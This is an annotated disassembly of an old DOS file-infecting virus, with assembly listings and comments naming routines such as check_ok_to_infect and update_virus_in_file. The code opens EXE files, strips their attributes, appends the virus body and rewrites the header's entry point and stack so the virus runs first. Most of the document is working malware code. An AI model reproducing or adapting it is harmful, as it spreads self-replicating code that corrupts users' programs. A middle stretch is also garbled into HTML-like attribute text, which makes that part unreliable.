

	page	,132
;
;   Note:  This is a disassembly of a NAKED virus, started at offset 0.
;          This makes everything come out neat.
;
;   Note:  The virus is missing its initial startup code (the JMP to
;          the JMP at h_0002).
;
;   I got tired of disassembling this virus.   It was written in a
;   high-level language (possibly C, based on calling convention, or
;   BASIC, based on ignoring BRUN and BASRUN).  If you want "More!,"
;   feel free to indulge yourself.
;
fun	segment
assume	cs:fun,ds:fun,es:fun,ss:fun
;
;  start of program
;
	org	0000h
;
;   exe_entry??
;
h_0000:
	jmp	short h_006c
;
;   com_entry
;
h_0002:
	jmp	short h_0024			;skip data area
h_0004	dw	0100h				;ip_value
h_0006	dw	0aeah				;cs_disp
h_0008	dw	2493h				;ss_disp
h_000a	dw	0080h				;sp_value
h_000c	dw	2eebh				;saved_prog_start
h_000e	dw	4890h				;high word of saved_prog_start
h_0010	db	39h					;0010 9
h_0011	db	00h,00h,00h				;0011 ...
h_0014	db	0c4h,00h,0ah,00h			;0014 ....
h_0018	dw	0000h				;??
h_001a	dw	000ah				;??generation
h_001c	db	78h,56h,34h,12h			;virus_signature
h_0020	dw	0088h				;virus_continuation_ip
h_0022	dw	0dd0h				;virus_seg
h_0024:
	cli					;do not disturb
	mov	ax,[h_0101]			;get JMP offset
	inc	ax				;-offset h_0002+3 (3=JMP size)
						;= virus start!
	mov	cl,04h				;for 4-bit shift
	shr	ax,cl				;get paragraphs to viurs
	mov	bx,ds				;PSP seg
	add	ax,bx				;plus paragraphs to virus
	add	ax,0010h			;plus PSP size
	mov	ds,ax				;address new seg
	mov	[h_0174],es			;save psp_seg
	mov	[h_0176],ss			;and stack_seg
	mov	sp,4e20h			;set local stack ofs
	mov	ss,ax				;and local stack seg
	sti					;ints are OK again
	mov	ax,[h_000c]			;get saved_prog_start (low)
	mov	cs:[0100h],ax			;replace it
	mov	ax,[h_000e]			;get saved_prog_start (high)
	mov	cs:[0102h],ax			;replace it
	mov	[h_0022],ds			;set virus_seg
	mov	word ptr [h_0020],offset h_0088	;and virus_continuation_ip
	mov	word ptr [h_0004],offset h_0100	;set ip_value
	mov	[h_0006],cs			;and cs_disp
	push	ds				;virus segment
	pop	es				;to es
	jmp	dword ptr [h_0020]		;continue virus init
;
;   EXE init comes here
;
h_006c:
	mov	cs:[h_0174],ds			;save PSP seg
	push	cs				;current segment
	pop	ds				;to ds
	mov	ax,es				;get PSP segment
	add	ax,0010h			;plus PSP size (paragraphs)
	add	[h_0006],ax			;relocate cs_disp
	add	[h_0008],ax			;and ss_disp
	push	ds				;virus segment
	pop	es				;to es
	mov	word ptr [h_0176],0000h		;clear stack_seg
h_0088:
	push	ds				;save virus seg
	xor	ax,ax				;get a 0
	mov	ds,ax				;address INT seg
	mov	bx,0084h			;ofs of INT 21 vector
	mov	ax,[bx]				;get INT 21 ofs
	or	ax,[bx+02h]			;and INT 21 seg
	pop	ds				;restore ds
	cmp	ax,0000h			;both ofs, seg 0?
	jz	h_00ba				;yes, skip this
	mov	ah,1ah				;fn = set DTA
	mov	dx,offset h_00f4		;ds:dx = local_dta
	int	21h				;set dta
	mov	word ptr [h_0178],0000h		;clear error_return
	cld					;up!
	call	h_0b70				;call ??
	push	ds
	mov	ax,[h_0174]
	mov	ds,ax
	mov	dx,0080h
	mov	ah,1ah
	int	21h				;set dta
	pop	ds
h_00ba:
	mov	ax,[h_0174]
	mov	es,ax
	push	es
	pop	ds
	xor	ax,ax
	xor	bx,bx
	xor	cx,cx
	xor	dx,dx
	xor	si,si
	xor	di,di
	xor	bp,bp
	cli	
	cmp	word ptr cs:[h_0176],+00h
	jz	h_00e2
	mov	ss,cs:[h_0176]
	mov	sp,0fffeh
	jmp	short h_00ee
h_00e2:
	mov	sp,cs:[h_0008]
	mov	ss,sp
	mov	sp,cs:[h_000a]
h_00ee:
	sti	
	jmp	dword ptr cs:[h_0004]
;
;   local_dta
;
h_00f4	db	000ch dup (00h)				;00f4 .
h_0100	db	00h					;0100 .
h_0101	db	00h					;0101 .
h_0102	dw	002ch dup (0000h)			;0102 ..
h_015a	db	001ah dup (00h)				;015a .
h_0174	dw	0aeah				;psp_seg
h_0176	dw	0aeah				;stack_seg
h_0178	dw	0002h				;error_return
h_017a:
	push	bp				;save bp
	mov	bp,sp				;set up stack frame
	sub	sp,+10h
				;bp-10 -> dos_ax
				;bp-0e -> dos_bx
				;bp-0c -> dos_cx
				;bp-0a -> dos_dx
				;bp-08 -> dos_si
				;bp-06 -> dos_di
				;bp-04 -> dos_error
				;bp-02 -> dos_flags
	mov	byte ptr [bp-0fh],47h		;
	mov	byte ptr [bp-0ah],00h
	mov	ax,[bp+04h]
	inc	ax
	mov	[bp-08h],ax
	lea	ax,[bp-10h]			;get ptr to dos_ax
	push	ax				;to stack
	call	h_0cb6				;call do_doscall
	pop	cx				;cleanup stack
	mov	bx,[bp+04h]
	mov	byte ptr [bx],5ch			;'\'
	mov	sp,bp
	pop	bp
	ret	
h_01a1:
	push	bp				;save bp
	mov	bp,sp				;set up stack frame
	sub	sp,+10h
				;bp-10 -> dos_ax
				;bp-0e -> dos_bx
				;bp-0c -> dos_cx
				;bp-0a -> dos_dx
				;bp-08 -> dos_si
				;bp-06 -> dos_di
				;bp-04 -> dos_error
				;bp-02 -> dos_flags
	mov	byte ptr [bp-0fh],3bh			;';'
	mov	ax,[bp+04h]
	mov	[bp-0ah],ax
	lea	ax,[bp-10h]			;get ptr to dos_ax
	push	ax				;to stack
	call	h_0cb6				;call do_doscall
	pop	cx				;cleanup stack
	test	word ptr [bp-02h],0001h
	jz	h_01c5
	mov	ax,[bp-10h]
	jmp	short h_01c7
h_01c5:
	xor	ax,ax
h_01c7:
	mov	sp,bp
	pop	bp
	ret	
;
;			access_file
;   bp+4 -> ofs of name found in DTA
;
h_01cb:
	push	bp				;save bp
	mov	bp,sp				;set up stack frame
	sub	sp,+10h
				;bp-10 -> dos_ax
				;bp-0e -> dos_bx
				;bp-0c -> dos_cx
				;bp-0a -> dos_dx
				;bp-08 -> dos_si
				;bp-06 -> dos_di
				;bp-04 -> dos_error
				;bp-02 -> dos_flags
	mov	word ptr [bp-10h],3d12h		;dos_ax = open file,
						;read/write, EXCLUSIVE
	mov	ax,[bp+04h]			;get ofs of name found in DTA
	mov	[bp-0ah],ax			;to dos_dx
	lea	ax,[bp-10h]			;get ptr to dos_ax
	push	ax				;to stack
	call	h_0cb6				;call do_doscall
	pop	cx				;cleanup stack
	test	word ptr [bp-02h],0001h		;check dos_flags for error
	jz	h_01f0				;none, continue
	mov	ax,0ffffh			;flag error (handle = FFFF)
	jmp	short h_01f3			;and done
h_01f0:
	mov	ax,[bp-10h]			;get dos_ax = handle
h_01f3:
	mov	sp,bp				;cleanup locals
	pop	bp				;restore bp
	ret					;and done
;
;			write_to_file
;   bp+8 -> size to write
;   bp+6 -> ofs of write
;   bp+4 -> handle
;
h_01f7:
	push	bp				;save bp
	mov	bp,sp				;set up stack frame
	sub	sp,+10h
				;bp-10 -> dos_ax
				;bp-0e -> dos_bx
				;bp-0c -> dos_cx
				;bp-0a -> dos_dx
				;bp-08 -> dos_si
				;bp-06 -> dos_di
				;bp-04 -> dos_error
				;bp-02 -> dos_flags
	mov	byte ptr [bp-0fh],40h		;ah = fn = write to file
	mov	ax,[bp+04h]			;get handle
	mov	[bp-0eh],ax			;to dos_bx
	mov	ax,[bp+08h]			;get size to write
	mov	[bp-0ch],ax			;to dos_cx
	mov	ax,[bp+06h]			;get ofs of write
	mov	[bp-0ah],ax			;to dos_dx
	lea	ax,[bp-10h]			;get ptr to dos_ax
	push	ax				;to stack
	call	h_0cb6				;call do_doscall
	pop	cx				;cleanup stack
	test	word ptr [bp-02h],0001h		;check dos_flags for error
	jz	h_0226				;no error, skip this
	xor	ax,ax				;flag error (written = 0)
	jmp	short h_0229			;and done
h_0226:
	mov	ax,[bp-10h]			;get bytes written
h_0229:
	mov	sp,bp				;remove locals
	pop	bp				;restore bp
	ret					;and done
;
;			read_file
;   bp+8 -> bytes to read
;   bp+6 -> ofs of read buffer
;   bp+4 -> handle
h_022d:
	push	bp				;save bp
	mov	bp,sp				;set up stack frame
	sub	sp,+10h
				;bp-10 -> dos_ax
				;bp-0e -> dos_bx
				;bp-0c -> dos_cx
				;bp-0a -> dos_dx
				;bp-08 -> dos_si
				;bp-06 -> dos_di
				;bp-04 -> dos_error
				;bp-02 -> dos_flags
	mov	byte ptr [bp-0fh],3fh		;ah = fn = read file
	mov	ax,[bp+04h]			;get handle
	mov	[bp-0eh],ax			;to dos_bx
	mov	ax,[bp+08h]			;get bytes to read
	mov	[bp-0ch],ax			;to dos_cx
	mov	ax,[bp+06h]			;get ofs of read buffer
	mov	[bp-0ah],ax			;to dos_dx
	lea	ax,[bp-10h]			;get ptr to dos_ax
	push	ax				;to stack
	call	h_0cb6				;call do_doscall
	pop	cx				;cleanup stack
	test	word ptr [bp-02h],0001h		;check dos_flags for error
	jz	h_025c				;none, skip this
	xor	ax,ax				;bytes read = 0 (error)
	jmp	short h_025f			;and quit
h_025c:
	mov	ax,[bp-10h]			;get dos_ax = bytes read
h_025f:
	mov	sp,bp				;cleanup locals
	pop	bp				;restore bp
	ret					;and done
;
;			lseek_to_bof_plus_loc
;   bp+8 -> loc high
;   bp+6 -> loc low
;   bp+4 -> handle
;
h_0263:
	push	bp				;save bp
	mov	bp,sp				;set up stack frame
	sub	sp,+10h
				;bp-10 -> dos_ax
				;bp-0e -> dos_bx
				;bp-0c -> dos_cx
				;bp-0a -> dos_dx
				;bp-08 -> dos_si
				;bp-06 -> dos_di
				;bp-04 -> dos_error
				;bp-02 -> dos_flags
	mov	word ptr [bp-10h],4200h		;dos_ax = lseek to BOF+CX:DX
	mov	ax,[bp+04h]			;get handle
	mov	[bp-0eh],ax			;set dos_bx
	mov	ax,[bp+06h]			;get loc low
	mov	[bp-0ah],ax			;to dos_dx
	mov	ax,[bp+08h]			;get loc high
	mov	[bp-0ch],ax			;to dos_dx
	lea	ax,[bp-10h]			;get ptr to dos_ax
	push	ax				;to stack
	call	h_0cb6				;call do_doscall
	pop	cx				;cleanup stack
	mov	sp,bp				;remove locals
	pop	bp				;restore bp
	ret					;and done
h_028c:
	push	bp				;save bp
	mov	bp,sp				;set up stack frame
	sub	sp,+10h
				;bp-10 -> dos_ax
				;bp-0e -> dos_bx
				;bp-0c -> dos_cx
				;bp-0a -> dos_dx
				;bp-08 -> dos_si
				;bp-06 -> dos_di
				;bp-04 -> dos_error
				;bp-02 -> dos_flags
	mov	byte ptr [bp-0fh],3eh			;'>'
	mov	ax,[bp+04h]
	mov	[bp-0eh],ax
	lea	ax,[bp-10h]			;get ptr to dos_ax
	push	ax				;to stack
	call	h_0cb6				;call do_doscall
	pop	cx				;cleanup stack
	mov	sp,bp
	pop	bp
	ret	
;
;			open_file_get_timedate
;   bp+4 -> name found in local DTA
;
h_02a8:
	push	bp				;save bp
	mov	bp,sp				;set up stack frame
	sub	sp,+10h				;allocate locals
				;bp-10 -> dos_ax
				;bp-0e -> dos_bx
				;bp-0c -> dos_cx
				;bp-0a -> dos_dx
				;bp-08 -> dos_si
				;bp-06 -> dos_di
				;bp-04 -> dos_error
				;bp-02 -> dos_flags

	push	si				;save register var
	mov	si,[bp+04h]			;get ofs of filename in DTA
	mov	byte ptr [h_1044],00h		;clear file_changed
	mov	word ptr [bp-10h],4300h		;dos_ax = get file attributes
	mov	[bp-0ah],si			;dos_dx = ofs of name in DTA
	lea	ax,[bp-10h]			;get ptr to dos_ax
	push	ax				;to stack
	call	h_0cb6				;call do_doscall
	pop	cx				;cleanup stack
	mov	ax,[bp-0ch]			;get dos_cx = attributes
	mov	[h_1050],ax			;save attributes
	test	ax,00dfh			;any strange attributes?
	jz	h_02ec				;no, skip this
	mov	word ptr [bp-10h],4301h		;dos_ax = set file attributes
	mov	word ptr [bp-0ch],0000h		;dos_cx = NO attributes
	mov	[bp-0ah],si			;dos_dx = ofs of name in DTA
	lea	ax,[bp-10h]			;get ptr to dos_ax
	push	ax				;to stack
	call	h_0cb6				;call do_doscall
	pop	cx				;cleanup stack
	mov	byte ptr [h_1044],01h		;set file_changed
h_02ec:
	push	si				;ptr to name in DTA to stack
	call	h_01cb				;call access_file
	pop	cx				;cleanup stack
	mov	[h_0ff2],ax			;save handle
	mov	word ptr [bp-10h],5700h		;dos_ax = get file time/date
	mov	ax,[h_0ff2]			;get handle
	mov	[bp-0eh],ax			;to dos_bx
	lea	ax,[bp-10h]			;get ptr to dos_ax
	push	ax				;to stack
	call	h_0cb6				;call do_doscall
	pop	cx				;cleanup stack
	mov	ax,[bp-0ch]			;get dos_cx
	mov	[h_105c],ax			;save file_time
	mov	ax,[bp-0ah]			;get dos_dx
	mov	[h_1052],ax			;save file_date
	pop	si				;restore reg var
	mov	sp,bp				;cleanup locals
	pop	bp				;restore bp
	ret					;and done
h_0318:
	push	bp				;save bp
	mov	bp,sp				;set up stack frame
	sub	sp,+10h
				;bp-10 -> dos_ax
				;bp-0e -> dos_bx
				;bp-0c -> dos_cx
				;bp-0a -> dos_dx
				;bp-08 -> dos_si
				;bp-06 -> dos_di
				;bp-04 -> dos_error
				;bp-02 -> dos_flags
	cmp	byte ptr [h_1044],00h		;clear file_changed
	jz	h_0344
	mov	word ptr [bp-10h],5701h
	mov	ax,[h_0ff2]			;get handle
	mov	[bp-0eh],ax
	mov	ax,[h_105c]
	mov	[bp-0ch],ax
	mov	ax,[h_1052]
	mov	[bp-0ah],ax
	lea	ax,[bp-10h]			;get ptr to dos_ax
	push	ax				;to stack
	call	h_0cb6				;call do_doscall
	pop	cx				;cleanup stack
h_0344:
	push	word ptr [h_0ff2]		;handle to stack
	call	h_028c
	pop	cx
	cmp	byte ptr [h_1044],00h		;check file_changed
	jz	h_036c
	mov	word ptr [bp-10h],4301h
	mov	ax,[h_1050]
	mov	[bp-0ch],ax
	mov	ax,[bp+04h]
	mov	[bp-0ah],ax
	lea	ax,[bp-10h]			;get ptr to dos_ax
	push	ax				;to stack
	call	h_0cb6				;call do_doscall
	pop	cx				;cleanup stack
h_036c:
	mov	sp,bp
	pop	bp
	ret	
;
;			get_file_word
;   bp+6 -> high word of loc
;   bp+4 -> low word of loc
;
h_0370:
	push	bp				;save bp
	mov	bp,sp				;set up stack frame
	sub	sp,+02h				;allocate local
	push	word ptr [bp+06h]		;loc high to stack
	push	word ptr [bp+04h]		;loc low to stack
	push	word ptr [h_0ff2]		;handle to stack
	call	h_0263				;call lseek_to_bof_plus_loc
	add	sp,+06h				;cleanup stack
	mov	ax,0002h			;bytes to read
	push	ax				;to stack
	lea	ax,[bp-02h]			;get ptr to read buf
	push	ax				;to stack
	push	word ptr [h_0ff2]		;handle to stack
	call	h_022d				;call read_file
	add	sp,+06h				;cleanup stack
	mov	ax,[bp-02h]			;get ??
	mov	sp,bp				;remove local
	pop	bp				;restore bp
	ret					;and done
;
;			get_file_dword
;   bp+6 -> high word of loc
;   bp+4 -> low word of loc
;
h_039f:
	push	bp				;save bp
	mov	bp,sp				;set up stack frame
	sub	sp,+04h				;allocate locals
	push	word ptr [bp+06h]		;high word of loc to stack
	push	word ptr [bp+04h]		;low word of loc to stack
	push	word ptr [h_0ff2]		;handle to stack
	call	h_0263				;call lseek_to_bof_plus_loc
	add	sp,+06h				;cleanup stack
	mov	ax,0004h			;bytes to read
	push	ax				;to stack
	lea	ax,[bp-04h]			;ofs of read buffer
	push	ax				;to stack
	push	word ptr [h_0ff2]		;handle to stack
	call	h_022d				;call read_file				;call read_file
	add	sp,+06h				;cleanup stack
	mov	dx,[bp-02h]			;get high word
	mov	ax,[bp-04h]			;and low word
	mov	sp,bp				;remove locals
	pop	bp				;restore bp
	ret					;and done
;
;			write_word_at_loc
;   bp+8 -> word to write
;   bp+6 -> high word of ofs
;   bp+4 -> low word of ofs
;
h_03d1:
	push	bp				;save bp
	mov	bp,sp				;set up stack frame
	push	word ptr [bp+06h]		;high word of loc to stack
	push	word ptr [bp+04h]		;low word of loc to stack
	push	word ptr [h_0ff2]		;handle to stack
	call	h_0263				;call lseek_to_bof_plus_loc
	mov	sp,bp				;cleanup stack
	mov	ax,0002h			;size of word
	push	ax				;to stack
	lea	ax,[bp+08h]			;ofs of word
	push	ax				;ptr to word to stack
	push	word ptr [h_0ff2]		;handle to stack
	call	h_01f7				;call write_to_file
	mov	sp,bp				;cleanup stack
	pop	bp				;restore bp
	ret					;and done
;
;			write_dword_at_loc
;   bp+0a -> high word of value
;   bp+08 -> low word of value
;   bp+06 -> high word of loc
;   bp+04 -> low word of loc
;
h_03f6:
	push	bp				;save bp
	mov	bp,sp				;set up stack frame
	push	word ptr [bp+06h]		;high word of loc to stack
	push	word ptr [bp+04h]		;low word of loc to stack
	push	word ptr [h_0ff2]		;handle to stack
	call	h_0263				;call lseek_to_bof_plus_loc
	mov	sp,bp				;cleanup stack
	mov	ax,0004h			;bytes in dword
	push	ax				;to stack
	lea	ax,[bp+08h]			;ofs of value on stack
	push	ax				;pointer to stack
	push	word ptr [h_0ff2]		;handle to stack
	call	h_01f7				;call write_to_file
	mov	sp,bp				;cleanup stack
	pop	bp				;restore bp
	ret					;and done
;
;			update_virus_in_file
;
h_041b:
	mov	dx,[h_1042]			;get work_size_high
	mov	ax,[h_1040]			;and work_size_low
	add	ax,0ec00h			;subtract offset h_1400
	adc	dx,-01h				;from both words
	push	dx				;loc high to stack
	push	ax				;loc low to stack
	push	word ptr [h_0ff2]		;handle to stack
	call	h_0263				;call lseek_to_bof_plus_loc
	add	sp,+06h				;cleanup stack
	mov	ax,0004h			;size to write
	push	ax				;to stack
	xor	ax,ax				;ofs of start of virus
	push	ax				;to stack
	push	word ptr [h_0ff2]		;handle to stack
	call	h_01f7				;call write_to_file
	add	sp,+06h				;cleanup stack
	mov	dx,[h_1042]			;get work_size_high
	mov	ax,[h_1040]			;and work_size_low
	add	ax,0ec18h			;back to ofs of
	adc	dx,-01h				;h_13e8 (??)
	push	dx				;high word of loc to stack
	push	ax				;and low word
	push	word ptr [h_0ff2]		;handle to stack
	call	h_0263				;call lseek_to_bof_plus_loc
	add	sp,+06h				;cleanup stack
	mov	ax,offset h_1400-h_0018		;size of virus code (13e8h)
	push	ax				;to stack
	mov	ax,offset h_0018		;ofs of virus code
	push	ax				;to stack
	push	word ptr [h_0ff2]		;handle to stack
	call	h_01f7				;call write_to_file
	add	sp,+06h				;cleanup stack
	mov	byte ptr [h_1044],01h		;set file_changed
	ret					;and done
;
;			check_ok_to_infect
;
h_0476:
	push	bp				;save bp
	mov	bp,sp				;set up stack frame
	sub	sp,+04h				;allocate locals
	push	si				;save reg var
	mov	dx,[h_105a]			;get filesize_high
	mov	ax,[h_1058]			;and filesize_low
	mov	[h_1042],dx			;save work_size_high
	mov	[h_1040],ax			;and work_size_low
	cmp	word ptr [h_1042],+00h		;filesize > 32K * 65536?
	jge	h_0495				;no, continue
	jmp	h_0517				;else skip all this
h_0495:
	jg	h_04a2				;file > 64K, skip this
	cmp	word ptr [h_1040],offset h_1400	;file at least virus size?
	ja	h_04a2				;yes, continue
	jmp	h_0517				;else skip all this
h_04a2:
	mov	dx,[h_1042]			;get work_size_high
	mov	ax,[h_1040]			;and work_size_low
	add	ax,0ec00h			;size - offset h_1400
	adc	dx,-01h				;both words
	mov	[bp-02h],dx			;save size - virus
	mov	[bp-04h],ax			;both words
	mov	dx,[bp-02h]			;and get it again!
	mov	ax,[bp-04h]
				;NOTE: Compiler could use a peephole
				;      optimizer!
	add	ax,offset h_001c		;plus ofs to virus_signature
	adc	dx,+00h				;both words
	push	dx				;file loc to stack
	push	ax				;both words
	call	h_039f				;call get_file_dword
	pop	cx				;cleanup stack
	pop	cx				;both words
	cmp	dx,1234h			;high word of signature?
	jnz	h_0517				;no, continue
	cmp	ax,5678h			;low word of signature?
	jnz	h_0517				;no, continue
	mov	dx,[bp-02h]			;get size - virus size
	mov	ax,[bp-04h]			;low word, too!
	add	ax,offset h_001a		;plus ofs to ??
	adc	dx,+00h				;both words
	push	dx				;file low to stack
	push	ax				;both words
	call	h_0370				;call get_file_word
	pop	cx				;cleanup stack
	pop	cx
	mov	si,ax				;??genration to si
	cmp	si,[h_001a]			;check our ??generation
	jnae	h_0512				;below, go ??
	cmp	si,[h_001a]			;check our ??generation
	jnz	h_052e				;not equal, we're done
	cmp	word ptr [h_0018],+00h		;check ??
	jz	h_052e				;yes, we're done
	mov	dx,[bp-02h]			;get size - virus size
	mov	ax,[bp-04h]			;low word, too
	add	ax,offset h_0018		;plus ofs to ??
	adc	dx,+00h				;both words
	push	dx				;loc high to stack
	push	ax				;and loc low
	call	h_0370				;call get_file_word
	pop	cx				;cleanup stack
	pop	cx
	or	ax,ax				;is ?? 0?
	jnz	h_052e				;no, skip this
h_0512:
	call	h_041b				;call update_virus_in_file
	jmp	short h_052e			;and skip this
h_0517:
	cmp	word ptr [h_104e],+00h		;check disk_free_bytes (high)
	ja	h_0533				;>64K free, skip this
	jnae	h_0528				;<0 report="" error="" cmp="" word="" ptr="" [h_104c],offset="" h_1400="" ;enough="" for="" virus?="" jae="" h_0533="" ;yes,="" report="" ok="" h_0528:="" mov="" word="" ptr="" [h_0ff8],7fffh="" ;flag="" error="" in="" handle="" h_052e:="" mov="" ax,0001h="" ;set="" error="" flag="" jmp="" short="" h_0535="" ;and="" done="" h_0533:="" xor="" ax,ax="" ;set="" ok="" flag="" h_0535:="" pop="" si="" ;restore="" reg="" var="" mov="" sp,bp="" ;cleanup="" locals="" pop="" bp="" ;restore="" bp="" ret="" ;and="" done="" ;="" ;="" ;="" h_053a:="" push="" bp="" ;save="" bp="" mov="" bp,sp="" ;set="" up="" stack="" frame="" sub="" sp,+04h="" ;allocate="" locals="" call="" h_0476="" ;call="" check_ok_to_infect="" or="" ax,ax="" ;ok="" to="" infect?="" jz="" h_054a="" ;yes,="" continue="" jmp="" h_07f3="" ;else="" exit="" routine="" h_054a:="" xor="" ax,ax="" ;get="" a="" 0="" push="" ax="" ;for="" high="" word="" of="" loc="" push="" ax="" ;and="" low="" word="" call="" h_0370="" ;call="" get_file_word="" pop="" cx="" ;cleanup="" stack="" pop="" cx="" cmp="" ax,5a4dh="" ;exe="" signature?="" ('mz')="" jz="" h_055b="" ;yes,="" do="" exe="" stuff="" jmp="" h_07f3="" ;else="" exit="" routine="" h_055b:="" xor="" dx,dx="" ;location="" of="" len="" mod="" 512="" mov="" ax,0002h="" ;in="" exe="" header="" push="" dx="" ;loc="" to="" stack="" push="" ax="" call="" h_0370="" ;call="" get_file_word="" pop="" cx="" ;cleanup="" stack="" pop="" cx="" xor="" dx,dx="" ;make="" it="" a="" dword="" mov="" [h_1042],dx="" ;save="" work_size_high="" mov="" [h_1040],ax="" ;and="" work_size_low="" mov="" ax,[h_1040]="" ;get="" work_size_low="" or="" ax,[h_1042]="" ;check="" with="" work_size_high="" jnz="" h_0585="" ;not="" empty,="" skip="" this="" mov="" word="" ptr="" [h_1042],0000h="" ;update="" work_size="" for="" pages="" mov="" word="" ptr="" [h_1040],0200h="" ;reported="" in="" exe="" header="" h_0585:="" xor="" dx,dx="" ;loc="" of="" len="" in="" pages="" mov="" ax,0004h="" ;in="" exe="" header="" push="" dx="" ;to="" stack="" push="" ax="" call="" h_0370="" ;call="" get_file_word="" pop="" cx="" ;cleanup="" stack="" pop="" cx="" xor="" dx,dx="" ;make="" pages="" a="" dword="" mov="" cl,09h="" ;for="" 9-bit="" shift="" push="" cs="" ;current="" seg="" to="" stack="" (for="" retf)="" call="" h_0e4c="" ;call="" dword_shl="" add="" ax,[h_1040]="" ;plus="" work_size_low="" adc="" dx,[h_1042]="" ;and="" work_size_high="" add="" ax,0fe00h="" ;-200h="" (rounding)="" adc="" dx,-01h="" ;on="" both="" words="" mov="" [h_1042],dx="" ;save="" work_size_high="" mov="" [h_1040],ax="" ;and="" work_size_low="" mov="" dx,[h_1042]="" ;get="" work_size="" again="" mov="" ax,[h_1040]="" ;get="" an="" optimizer!="" add="" ax,0200h="" ;round="" to="" next="" page="" adc="" dx,+00h="" ;both="" words="" cmp="" dx,[h_105a]="" ;check="" filesize_high="" jae="" h_05c4="" ;no="" overflow,="" continue="" jmp="" h_07f3="" ;else=""> 4GIG, exit routine
h_05c4:
	jnz	h_05cf				;no overflow over 64K-skip this
	cmp	ax,[h_1058]			;check low word??
	jae	h_05cf				;OK, continue
	jmp	h_07f3				;else exit routine
h_05cf:
	mov	dx,[h_105a]			;get filesize_high
	mov	ax,[h_1058]			;and filesize_low
	mov	[h_1042],dx			;as new work_size_high
	mov	[h_1040],ax			;and work_size_low
	xor	dx,dx				;ofs of header size
	mov	ax,0008h			;(paragraphs) in header
	push	dx				;loc to stack
	push	ax
	call	h_0370				;call get_file_word
	pop	cx				;cleanup stack
	pop	cx
	mov	cl,04h				;for 4-bit shift
	shl	ax,cl				;get header in bytes
				;BUG: Header can be >64K!
	xor	dx,dx				;high word is 0
	mov	[h_1056],dx			;save header_bytes_high
	mov	[h_1054],ax			;and header_bytes_low
	xor	dx,dx				;ofs of loc of len mod 512
	mov	ax,0002h			;in header
	push	dx				;loc to stack
	push	ax
	call	h_039f				;call get_file_dword
	pop	cx				;cleanup stack
	pop	cx
	mov	[bp-02h],dx			;save old size in pages
	mov	[bp-04h],ax			;and old len mod 512
	mov	dx,[h_1042]			;get work_size_high
	mov	ax,[h_1040]			;and work_size_low
	sub	ax,[h_1054]			;minus header_bytes
	sbb	dx,[h_1056]			;both words
	mov	[h_1048],dx			;save size_minus_header
	mov	[h_1046],ax			;both words
	mov	byte ptr [h_1044],01h		;set file_changed
	push	word ptr [h_1042]		;work_size_high
	push	word ptr [h_1040]		;and work_size_low to stack
	push	word ptr [h_0ff2]		;handle to stack
	call	h_0263				;call lseek_to_bof_plus_loc
	add	sp,+06h				;cleanup stack
	jmp	short h_0664			;skip this code
h_0637:
	mov	ax,0001h			;bytes to pad file with
	push	ax				;to stack
	xor	ax,ax				;start of virus = random buffer
	push	ax				;to stack
	push	word ptr [h_0ff2]		;handle to stack
	call	h_01f7				;call write_to_file
	add	sp,+06h				;cleanup stack
	cmp	ax,0001h			;was it written?
	jz	h_0650				;yes, continue
	jmp	h_07f3				;else exit routine
h_0650:
	add	word ptr [h_1046],+01h		;update size_minus_header
	adc	word ptr [h_1048],+00h		;both words
	add	word ptr [h_1040],+01h		;update work_size
	adc	word ptr [h_1042],+00h		;both words
h_0664:
	mov	dx,[h_1048]			;get size_minus_header
	mov	ax,[h_1046]			;low word, too
	and	ax,000fh			;isolate low nibble
	and	dx,0000h
	or	dx,ax				;any leftover bytes?
	jnz	h_0637				;yes, need to pad file
	mov	ax,offset h_1400		;virus size
	push	ax				;to stack
	xor	ax,ax				;ofs of virus start
	push	ax				;to stack
	push	word ptr [h_0ff2]		;handle to stack
	call	h_01f7				;call write_to_file
	add	sp,+06h				;cleanup stack
	cmp	ax,offset h_1400		;all bytes written?
	jz	h_068f				;yes, continue
	jmp	h_07f3				;else exit routine
h_068f:
	sub	word ptr [h_104c],offset h_1400	;udpate disk_free_bytes
	sbb	word ptr [h_104e],+00h		;both words
	xor	dx,dx				;ofs of IP value
	mov	ax,0014h			;in EXE header
	push	dx				;loc to stack
	push	ax
	call	h_039f				;call get_file_dword
	pop	cx				;cleanup stack
	pop	cx
	push	dx				;CS displacement to stack
	push	ax				;IP value to stack
	mov	dx,[h_1042]			;get work_size_high
	mov	ax,[h_1040]			;and work_size_low
	add	ax,0004h			;plus ??
	adc	dx,+00h				;both words
	push	dx				;loc to stack
	push	ax				;both words
	call	h_03f6				;call write_dword_at_loc
	add	sp,+08h				;cleanup stack
	xor	dx,dx				;ofs of SS disp
	mov	ax,000eh			;in EXE header
	push	dx				;loc to stack
	push	ax
	call	h_039f				;call get_file_dword
	pop	cx				;cleanup stack
	pop	cx
	push	dx				;SP value to stack
	push	ax				;SS displacement to stack
	mov	dx,[h_1042]			;get work_size_high
	mov	ax,[h_1040]			;and work_size_low
	add	ax,0008h			;plus ??
	adc	dx,+00h				;both words
	push	dx				;loc to stack
	push	ax				;both words
	call	h_03f6				;call write_dword_at_loc
	add	sp,+08h				;cleanup stack
	push	word ptr [h_105a]		;filesize_high to stack
	push	word ptr [h_1058]		;filesize_low to stack
	mov	dx,[h_1042]			;get work_size_high
	mov	ax,[h_1040]			;and work_size_low
	add	ax,0010h			;plus PSP size (??)
	adc	dx,+00h				;both words
	push	dx				;to stack
	push	ax
	call	h_03f6				;call write_dword_at_loc
	add	sp,+08h				;cleanup stack
	push	word ptr [bp-02h]		;old len mod 512
	push	word ptr [bp-04h]		;old len in pages
	mov	dx,[h_1042]			;get work_size_high
	mov	ax,[h_1040]			;and work_size_low
	add	ax,0014h			;plus ??
	adc	dx,+00h				;both words
	push	dx				;loc to stack
	push	ax
	call	h_03f6				;call write_dword_at_loc
	add	sp,+08h				;cleanup stack
	mov	dx,[h_1048]			;get size minus header
	mov	ax,[h_1046]			;low word, too
	mov	cl,04h				;for 4-bit shift
	push	cs				;current seg to stack (for RETF)
	call	h_0e2e				;call dword_sar
	xor	dx,dx		;finish from here
	or	ax,0000h
	or	dx,4e20h				;' N'
	push	dx
	push	ax
	xor	dx,dx
	mov	ax,offset h_000e
	push	dx
	push	ax
	call	h_03f6				;call write_dword_at_loc
	add	sp,+08h				;cleanup stack
	mov	dx,[h_1048]
	mov	ax,[h_1046]
	mov	cl,04h
	push	cs				;current seg to stack (for RETF)
	call	h_0e2e				;call dword_sar
	mov	dx,ax
	xor	ax,ax
	push	dx
	push	ax
	xor	dx,dx
	mov	ax,offset h_0014
	push	dx
	push	ax
	call	h_03f6				;call write_dword_at_loc
	add	sp,+08h				;cleanup stack
	add	word ptr [h_1040],offset h_1400
	adc	word ptr [h_1042],+00h
